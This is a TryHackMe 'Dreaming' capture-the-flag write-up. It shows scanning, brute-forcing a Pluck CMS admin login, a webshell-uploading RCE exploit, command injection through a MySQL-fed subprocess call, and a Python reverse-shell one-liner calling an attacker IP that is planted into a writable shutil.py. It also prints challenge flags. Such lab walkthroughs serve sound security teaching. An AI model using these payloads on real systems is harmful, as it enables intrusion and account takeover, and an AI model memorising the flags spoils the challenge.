---
title: "Dreaming"
url: "/writeups/tryhackme/dreaming/"
summary: dreaming
tags:
- tryhackme
- linux
---

![Dreaming](/thm-dreaming.png)

## Scanning
### nmap
Started with an `nmap` scan:

* TCP all ports
```bash
kali@kali:~/ctf/thm/dreaming$ sudo nmap -T4 -p- -oA nmap/tcp_all_ports 10.10.31.54
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
* TCP with scripts against found ports
```bash
kali@kali:~/ctf/thm/dreaming$ sudo nmap -sCV -p22,80 -oA nmap/tcp_def_scripts 10.10.31.54
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA)
|   256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA)
|_  256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
## Enumeration
### Web Page
Found Apache2 Ubuntu Default Page
![Dreaming](/thm-dreaming-apache2_ubuntu_default_page.png)
### gobuster
```bash
kali@kali:~/ctf/thm/dreaming$ sudo gobuster dir -u http://10.10.31.54/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
/app                  (Status: 301) [Size: 308] [--> http://10.10.31.54/app/]
```
### /app
Found pluck-4.7.13/ link that directed to the pluck application
In the application it presents a link to the admin loging page as well
![Dreaming](/thm-dreaming-index_of_app.png)
![Dreaming](/thm-dreaming-pluck.png)
![Dreaming](/thm-dreaming-pluck_login.png)
### searchsploit
```bash
kali@kali:~/ctf/thm/dreaming$ searchsploit pluck 4.7.13
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)             | php/webapps/49909.py
--------------------------------------------------------------------------------- ---------------------------------
```
Found an exploit for the version of Pluck, but needs to be authenticated.
### Authentication Brute Force
Using Burp Suite Intruder the password can be brute forced for the admin user
1. Intercepted a Log in request and sent to Intruder
![Dreaming](/thm-dreaming-burp_intercept.png)
2. Cleared all payload markers then added one only to the `cont1` value
3. Set the Attack mode to Sniper and loaded the Seclists 500-worst-passwords.txt file as the Payload option
4. After starting the attack, based on the Status and Length, the password can be identified as `password`
![Dreaming](/thm-dreaming-burp_intruder_attack.png)
5. Enter in the found password into the Log In form does in fact give access to the Admin portal of the application
![Dreaming](/thm-dreaming-pluck_admin_access.png)

## Exploitation
Copied the found exploit locally and executed it.
```bash
kali@kali:~/ctf/thm/dreaming$ python3 exploit.py 10.10.31.54 80 password '/app/pluck-4.7.13'

Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://10.10.31.54:80/app/pluck-4.7.13/files/shell.phar
```
A URL is given and when navigating to it presents an interactive webshell as the `www-data` user
![Dreaming](/thm-dreaming-pluck_webshell.png)

## Foothold
### User - lucien
Doing some enumeration via the webshell, the file test.py can be found in the /opt directory
In that file, there is a password vairable with a value that can be used to login as the lucien user
![Dreaming](/thm-dreaming-pluck_webshell_enum.png)
#### SSH
```bash
kali@kali:~/ctf/thm/dreaming$ ssh lucien@10.10.31.54
```
#### User flag
```bash
lucien@dreaming:~$ cat lucien_flag.txt 
THM{TH3_L1BR4R14N}
```
## Privilege Escalation
### User - death

#### sudo -l
Running `sudo -l` as the lucien user show that one file can be executed as the death user
```bash
lucien@dreaming:~$ sudo -l
Matching Defaults entries for lucien on dreaming:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```
Executing this file just shows output of names and what will be known as their dreams.
This file us not readable to the lucien user, so not sure exactly what is happening as of now.

#### mysql
In the lucien home directory there is also a file `.mysql_history` which shows some previous mysql commands as well as a potential mysql database password.
Using `ss`, it can be confirmed that there is a mysql server running on the localhost
```bash
lucien@dreaming:~$ ss -tln
State            Recv-Q           Send-Q                      Local Address:Port                        Peer Address:Port           Process                                    
LISTEN           0                151                             127.0.0.1:3306                             0.0.0.0:*  
```
With the found password the database can be connected to:
```bash
lucien@dreaming:~$ mysql -u lucien -plucien42DBPASSWORD
```
* Looking at previous command and using `SHOW GRANTS`; it can be determined that the lucien user can `INSERT INTO` the dreams table of the library database
* After some initial testing the lucien user is able to add values to the dreams table to the dreams column and the dream column which is what gets printed out by the `getDreams.py` file
* During enumeration it was also identified that there is another `getDreams.py` file which can be read by the lucien user
* Looking at the part of the file of what is printing out, there is a `subprocess.check_output` function being used
* Searching on 'python subprocess check exploit' finds a knowledge base that gives information on how this function can be exploited
    * https://knowledge-base.secureflag.com/vulnerabilities/code_injection/os_command_injection_python.html

Using the below mysql command shows the database password used by the death user which can also be used to log into their account
```mysql
mysql> INSERT INTO dreams (dreamer, dream) VALUES ('whoami', 'TEST2; cat /home/death/getDreams.py);
```

```bash
lucien@dreaming:~$ su death
```

#### User flag
```bash
death@dreaming:~$ cat death_flag.txt 
THM{1M_TH3R3_4_TH3M}
```

### User - morpheus
* During enumeration it was identified that the `shutil.py` file had a group ownership by the user death. This can be verified running the command `find / -group death 2>/dev/null`
* In the morpheus user home directory there is a `restore.py` file that makes use of the `copy2` function from the `shutil.py` package.
* Since the `shutil.py` file can be written to by the death user, a payload for a reverse shell can be added into the `copy2` function.
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.12.234",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
After starting a `netcat` listener (`nc -lvnp 4444`) and waiting a minute a reverse shell is returned and now have access as the morpheus user.

#### User Flag
```bash
morpheus@dreaming:~$ cat morpheus_flag.txt  
THM{DR34MS_5H4P3_TH3_W0RLD}
```
